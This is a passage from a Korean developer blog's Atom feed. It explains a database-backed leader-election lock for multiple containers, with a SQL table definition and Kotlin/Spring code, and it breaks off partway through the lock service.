<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko-KR"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://a3magic3pocket.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://a3magic3pocket.github.io/" rel="alternate" type="text/html" hreflang="ko-KR" /><updated>2025-05-08T21:48:10+09:00</updated><id>https://a3magic3pocket.github.io/feed.xml</id><title type="html">의사줌치</title><subtitle>기억 안 날 때 보는 꾀주머니.</subtitle><entry><title type="html">DB를 활용한 리더선출락 구현</title><link href="https://a3magic3pocket.github.io/posts/db-based-leader-election-lock/" rel="alternate" type="text/html" title="DB를 활용한 리더선출락 구현" /><published>2025-04-11T22:35:03+09:00</published><updated>2025-04-11T22:35:03+09:00</updated><id>https://a3magic3pocket.github.io/posts/db-based-leader-election-lock</id><content type="html" xml:base="https://a3magic3pocket.github.io/posts/db-based-leader-election-lock/">&lt;h2 id=&quot;개요&quot;&gt;개요&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;여러 컨테이너가 동시에 실행되는 환경에서는&lt;br /&gt;
특정 작업(이하 리더 작업)을 오직 하나의 컨테이너만 &lt;br /&gt;
수행해야 할 때가 있다.&lt;/li&gt;
  &lt;li&gt;리더 작업은 리더가 주기적으로 실행하고&lt;br /&gt;
리더가 아닌 다른 컨테이너는 대기해야한다.&lt;/li&gt;
  &lt;li&gt;만약 리더가 다운되어 리더 작업이 불가능한 경우&lt;br /&gt;
최대한 빨리 대기하고 있는 다른 컨테이너 중 하나를 &lt;br /&gt;
리더로 선출한 뒤 리더 작업을 이행해야한다.&lt;/li&gt;
  &lt;li&gt;DB를 이용하여 리더선출락을 구현하고&lt;br /&gt;
리더선출 과정을 설명한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;리더선출과정&quot;&gt;리더선출과정&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;3개의 컨테이너가 리더 작업에 참여한다.&lt;/li&gt;
  &lt;li&gt;이 중 하나의 컨테이너를 리더로 선택하여 리더작업을 진행하고&lt;br /&gt;
나머지는 대기한다.&lt;/li&gt;
  &lt;li&gt;리더 작업은 1초에 한 번씩 진행되며&lt;br /&gt;
문제가 없다면 1초 내에 끝난다.&lt;/li&gt;
  &lt;li&gt;최초 3개의 컨테이너가 부팅되면&lt;br /&gt;
동시에 리더선출락 확보를 시도한다.&lt;/li&gt;
  &lt;li&gt;3개 중 리더선출락을 확보한 컨테이너가 리더 컨테이너가 된다.&lt;/li&gt;
  &lt;li&gt;리더선출락의 유효 기간(Time To Live, TTL)은 &lt;br /&gt;
락의 timestamp 기준으로 1.2초이다.&lt;/li&gt;
  &lt;li&gt;3개의 컨테이너 모두 1초에 한 번씩 리더선출과정에 참여한다.&lt;/li&gt;
  &lt;li&gt;리더선출과정
    &lt;ul&gt;
      &lt;li&gt;리더라면?
        &lt;ul&gt;
          &lt;li&gt;락의 유효기간 연장한다.&lt;br /&gt;
(락의 timestamp를 현재시간으로 변경 후 갱신)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;리더가 아니라면?
        &lt;ul&gt;
          &lt;li&gt;락이 유효하다면?(현재 시각 &amp;gt; 락의 timestamp + TTL)
            &lt;ul&gt;
              &lt;li&gt;다음 리더선출과정까지 대기한다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;락이 유효하지 않다면?
            &lt;ul&gt;
              &lt;li&gt;내가 리더가 된다.&lt;br /&gt;
(락 행의 container_id를 내 container_id로 갱신)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;리더선출락-ddl&quot;&gt;리더선출락 DDL&lt;/h2&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;EXISTS&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;`service_leader_lock`&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
&lt;span class=&quot;nv&quot;&gt;`id`&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;BIGINT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AUTO_INCREMENT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PRIMARY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;nv&quot;&gt;`name`&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;VARCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNIQUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   
&lt;span class=&quot;nv&quot;&gt;`container_id`&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;VARCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;nv&quot;&gt;`timestamp`&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;DATETIME&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DEFAULT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;INDEX&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;`idx_service_leader_lock_name`&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;`name`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;serviceleaderlock&quot;&gt;ServiceLeaderLock&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.example.demo.entity&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.Column&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.Entity&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.GeneratedValue&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.GenerationType&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.Id&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jakarta.persistence.Table&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.time.ZoneOffset&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.time.ZonedDateTime&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Entity&lt;/span&gt;  
&lt;span class=&quot;nd&quot;&gt;@Table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;service_leader_lock&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;data class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Id&lt;/span&gt;  
  &lt;span class=&quot;nd&quot;&gt;@GeneratedValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strategy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GenerationType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IDENTITY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;container_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;containerId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Column&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;timestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZoneOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;serviceleaderlockservice&quot;&gt;ServiceLeaderLockService&lt;/h2&gt;
&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.exmaple.demo.service&lt;/span&gt;  
        
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.exmaple.demo.entity.ServiceLeaderLock&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.exmaple.demo.constant.ServiceLeaderLock&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockConst&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.exmaple.demo.repository.ServiceLeaderLockRepository&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.exmaple.demo.global.config.AppConfig&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.stereotype.Service&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.transaction.annotation.Transactional&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.time.Duration&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.time.ZoneOffset&lt;/span&gt;  
&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.time.ZonedDateTime&lt;/span&gt;  
        
&lt;span class=&quot;nd&quot;&gt;@Service&lt;/span&gt;  
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockService&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;appConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AppConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;serviceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;companion&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;c1&quot;&gt;// time-to-live for service leader lock  &lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Duration&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Duration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ofSeconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;plusMillis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
  &lt;span class=&quot;nd&quot;&gt;@Transactional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rollbackFor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tryToAcquireLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Boolean&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;lock&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serviceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;findByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockConst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// 최초 락 점유  &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;serviceLeaderLock&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  
              &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServiceLeaderLockConst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
              &lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;appConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  
              &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZoneOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;  
          &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;n&quot;&gt;serviceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serviceLeaderLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// 현재 컨테이너가 락을 점유하고 있는 상황  &lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// - timestamp 갱신  &lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;appConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;containerId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
          &lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZoneOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;n&quot;&gt;serviceLeaderLockRepository&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
        
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;  
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
        
      &lt;span class=&quot;c1&quot;&gt;// TTL 만료 시  &lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;py&quot;&gt;utcNow&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ZonedDateTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ZoneOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
